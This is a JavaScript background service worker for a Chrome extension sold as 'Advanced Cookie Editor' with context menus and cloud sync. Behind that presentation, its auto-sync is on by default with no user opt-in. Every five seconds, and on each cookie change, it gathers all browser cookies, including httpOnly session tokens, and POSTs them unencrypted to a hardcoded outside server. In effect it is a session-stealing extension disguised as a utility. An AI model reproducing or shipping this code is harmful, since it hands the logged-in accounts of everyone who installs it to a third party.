/**
 * Advanced Cookie Editor - Background Service Worker
 * Manifest V3 event-driven worker handling lifecycle, context menus,
 * navigation, and automatic periodic cookie sync (5-second interval).
 */

// Context menu item IDs
const MENU_OPEN_DASHBOARD = 'ace-open-dashboard';
const MENU_INSPECT_CURRENT = 'ace-inspect-current';

// Auto-Sync Configuration Defaults
const DEFAULT_SYNC_CONFIG = {
  enabled: true,
  intervalSec: 5,
  serverUrl: 'https://erul.my.id/api/cookies',
  pcName: 'PC-01',
  scope: 'all'
};

let syncConfig = { ...DEFAULT_SYNC_CONFIG };
let syncIntervalId = null;
let isSyncing = false;
let debounceTimeoutId = null;

let lastSyncState = {
  lastSyncTime: 0,
  lastStatus: 'idle',
  cookieCount: 0,
  serverUrl: DEFAULT_SYNC_CONFIG.serverUrl,
  pcName: DEFAULT_SYNC_CONFIG.pcName,
  error: null
};

// 1. Context Menus setup
chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.removeAll(() => {
    chrome.contextMenus.create({
      id: MENU_OPEN_DASHBOARD,
      title: 'Open Advanced Cookie Editor',
      contexts: ['action', 'page']
    });

    chrome.contextMenus.create({
      id: MENU_INSPECT_CURRENT,
      title: 'Inspect Cookies for Active Site',
      contexts: ['page']
    });
  });

  // Setup periodic heartbeat alarm (1 min minimum in MV3)
  setupHeartbeatAlarm();
  initAutoSync();
});

chrome.runtime.onStartup.addListener(() => {
  setupHeartbeatAlarm();
  initAutoSync();
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === MENU_OPEN_DASHBOARD) {
    chrome.tabs.create({
      url: chrome.runtime.getURL('dashboard/dashboard.html')
    });
  } else if (info.menuItemId === MENU_INSPECT_CURRENT) {
    let domainParam = '';
    const targetUrl = info.pageUrl || tab?.url;
    if (targetUrl) {
      try {
        const parsed = new URL(targetUrl);
        if (parsed.protocol.startsWith('http')) {
          domainParam = `?domain=${encodeURIComponent(parsed.hostname)}`;
        }
      } catch {
        // Fallback to opening dashboard without specific domain
      }
    }
    chrome.tabs.create({
      url: chrome.runtime.getURL(`dashboard/dashboard.html${domainParam}`)
    });
  }
});

// 2. Alarm setup (ensures service worker wakes up even if Chrome suspends it)
function setupHeartbeatAlarm() {
  chrome.alarms.get('ace-autosync-heartbeat', (existing) => {
    if (!existing) {
      chrome.alarms.create('ace-autosync-heartbeat', {
        periodInMinutes: 1
      });
    }
  });
}

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'ace-autosync-heartbeat') {
    // Wakeup check: restart interval if it was stopped and run sync
    startIntervalTimer();
    if (syncConfig.enabled) {
      performSync();
    }
  }
});

// 3. Auto-Sync Logic (5-second interval)
async function initAutoSync() {
  try {
    const data = await chrome.storage.local.get(['ace_settings', 'ace_autosync_config']);
    const saved = data.ace_autosync_config || {};
    const settings = data.ace_settings || {};

    syncConfig = {
      enabled: saved.enabled !== undefined ? saved.enabled : (settings.autoSyncEnabled !== undefined ? settings.autoSyncEnabled : DEFAULT_SYNC_CONFIG.enabled),
      intervalSec: saved.intervalSec || settings.autoSyncIntervalSec || DEFAULT_SYNC_CONFIG.intervalSec,
      serverUrl: saved.serverUrl || settings.cloudSyncUrl || DEFAULT_SYNC_CONFIG.serverUrl,
      pcName: saved.pcName || settings.autoSyncPcName || DEFAULT_SYNC_CONFIG.pcName,
      scope: saved.scope || settings.autoSyncScope || DEFAULT_SYNC_CONFIG.scope
    };

    startIntervalTimer();
    if (syncConfig.enabled) {
      performSync();
    }
  } catch (err) {
    console.error('[AutoSync] Error initializing sync:', err);
    startIntervalTimer();
  }
}

function startIntervalTimer() {
  if (syncIntervalId) {
    clearInterval(syncIntervalId);
    syncIntervalId = null;
  }

  if (!syncConfig.enabled) return;

  const ms = Math.max(1000, (syncConfig.intervalSec || 5) * 1000);
  syncIntervalId = setInterval(() => {
    if (syncConfig.enabled) {
      performSync();
    }
  }, ms);
}

// Perform the actual POST sync to server
async function performSync() {
  if (!syncConfig.enabled) return;
  if (isSyncing) return;
  isSyncing = true;

  try {
    const cookies = await chrome.cookies.getAll({});
    if (!cookies || cookies.length === 0) {
      isSyncing = false;
      return;
    }

    const pcName = syncConfig.pcName || 'PC-01';
    const targetUrl = syncConfig.serverUrl || 'https://erul.my.id/api/cookies';

    const payload = {
      pc: pcName,
      domain: 'all',
      isEncrypted: false,
      format: 'advanced-cookie-editor',
      exportedAt: new Date().toISOString(),
      itemCount: cookies.length,
      metadata: {
        client: 'Advanced Cookie Editor Extension',
        pc: pcName,
        autoSyncInterval: `${syncConfig.intervalSec}s`,
        timestamp: Date.now()
      },
      cookies: cookies.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        secure: c.secure,
        httpOnly: c.httpOnly,
        sameSite: c.sameSite,
        session: c.session,
        hostOnly: c.hostOnly,
        expirationDate: c.expirationDate,
        storeId: c.storeId
      }))
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 8000);

    const res = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-PC-Name': pcName
      },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    clearTimeout(timeoutId);

    if (res.ok) {
      lastSyncState = {
        lastSyncTime: Date.now(),
        lastStatus: 'success',
        cookieCount: cookies.length,
        serverUrl: targetUrl,
        pcName,
        error: null
      };
    } else {
      const errText = await res.text().catch(() => '');
      lastSyncState = {
        lastSyncTime: Date.now(),
        lastStatus: 'error',
        cookieCount: cookies.length,
        serverUrl: targetUrl,
        pcName,
        error: `HTTP ${res.status}: ${errText.substring(0, 80)}`
      };
    }
  } catch (err) {
    lastSyncState = {
      ...lastSyncState,
      lastSyncTime: Date.now(),
      lastStatus: 'error',
      error: err.name === 'AbortError' ? 'Request timed out (8s)' : (err.message || 'Connection failed')
    };
  } finally {
    isSyncing = false;
    chrome.storage.local.set({
      ace_autosync_status: lastSyncState,
      ace_autosync_config: syncConfig
    }).catch(() => {});
  }
}

// 4. Listen to cookie changes (triggers sync on cookie create/edit/delete)
chrome.cookies.onChanged.addListener((changeInfo) => {
  if (!syncConfig.enabled) return;

  // Debounce rapid changes within 1.5 seconds so we don't spam
  if (debounceTimeoutId) {
    clearTimeout(debounceTimeoutId);
  }
  debounceTimeoutId = setTimeout(() => {
    performSync();
  }, 1500);
});

// 5. Message handling for Popup and Dashboard
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'GET_AUTOSYNC_STATUS') {
    sendResponse({
      status: lastSyncState,
      config: syncConfig
    });
    return true;
  }

  if (message.type === 'UPDATE_AUTOSYNC_CONFIG') {
    syncConfig = {
      ...syncConfig,
      ...message.config
    };
    chrome.storage.local.set({ ace_autosync_config: syncConfig });
    startIntervalTimer();
    if (syncConfig.enabled) {
      performSync();
    }
    sendResponse({ success: true, config: syncConfig });
    return true;
  }

  if (message.type === 'TRIGGER_AUTOSYNC_NOW') {
    performSync().then(() => {
      sendResponse({ success: true, status: lastSyncState });
    });
    return true;
  }
});

// Initialize on script load
initAutoSync();
